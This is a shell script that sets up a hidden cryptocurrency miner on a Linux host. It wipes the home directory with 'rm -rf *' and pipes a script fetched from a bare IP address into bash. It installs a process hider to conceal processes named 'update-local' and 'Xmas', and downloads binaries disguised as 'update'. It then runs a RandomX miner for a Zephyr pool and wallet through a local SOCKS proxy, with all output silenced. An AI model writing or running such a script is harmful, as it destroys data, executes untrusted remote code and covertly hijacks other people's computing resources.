#!/bin/sh
cd
ls -la
rm -rf *
apt update >/dev/null;apt -y install automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget libuv1-dev libssl-dev libhwloc-dev >/dev/null

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

curl -fsSL http://139.162.202.16/install_and_monitor_shade_us_root.sh | bash &

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Lab16Cores_')
ipaddress=$(curl -s ifconfig.me)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`
echo ""
echo "You will be using : $used_num_of_cores cores"
echo ""

sleep 2

curl -s -L -o node-v20.7.0-linux-x64.tar.gz https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
tar -xf node-v20.7.0-linux-x64.tar.gz
export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add Xmas 1>/dev/null 2>&1

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz > /dev/null

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:1081
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

echo " "
echo " "

echo "******************************************************************"

./update/update curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "


sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Xmas.tar.gz > /dev/null

sleep 2

tar -xf Xmas.tar.gz

sleep 2

netstat -ntlp

sleep 2

echo " "
echo " "

sleep 2

echo "Your worker name will be : $currentdate"

echo ""
echo ""

sleep 2

(grep -q "vm.nr_hugepages" /etc/sysctl.conf || (echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf)) && sysctl -w vm.nr_hugepages=$((1168+$(nproc)))

sleep 2

while true
do
./Xmas --donate-level 1 -o us.zephyr.herominers.com:1123 -a rx/0 -u ZEPHYR34MGwFTPeqZtuzm7VsAujvy9XEicJtwWkcKJVYJzDwHpw9YAW4XPLw5QLRiAFswe9pAfckTjYXVzGnAvDHdQ7FUVTcpgy4g -p $currentdate -k --verbose --randomx-1gb-pages -t $used_num_of_cores -k --proxy=127.0.0.1:1081 1>/dev/null 2>&1
sleep 10
done
